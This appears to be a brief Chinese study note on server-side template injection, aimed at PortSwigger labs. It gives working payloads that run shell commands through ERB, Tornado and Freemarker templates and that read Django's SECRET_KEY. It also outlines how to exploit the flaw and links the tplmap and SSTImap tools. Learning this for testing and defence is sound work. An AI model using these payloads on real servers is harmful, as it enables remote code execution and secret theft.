# SSTI模板注入

![6e49179e182fe6acd64c594ec61a6877](images/6e49179e182fe6acd64c594ec61a6877.png)

```
SSTI(Server Side Template Injection) 服务器模板注入, 服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容。
参考：https://www.cnblogs.com/R3col/p/12746485.html

#SSTI测试：
靶场地址：https://portswigger.net/web-security/all-labs#server-side-template-injection
ERB：
<%= exec 'ls -al' %>

Tornado：
blog-post-author-display=user.name}}{{7*7}}
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('ls%20-al')

Freemarker：
<#assign test="freemarker.template.utility.Execute"?new()> ${test("ls")}

报错提示：

Django：
{{settings.SECRET_KEY}}

#SSTI利用思路：
1、确定模板引擎
	改参数看报错
	看模板语法
	引擎寻找构造
2、构造payload的思路
	寻找可用对象（比如字符串、字典，或者已给出的对象）
	通过可用对象寻找原生对象（object）
	利用原生对象实例化目标对象（比如os）
	执行代码
3、如果手工有困难，可用使用Tqlmap或SSTImap代替

#项目：
https://github.com/epinna/tplmap
https://github.com/vladko312/SSTImap

#挖掘：
https://forum.butian.net/share/1229
```

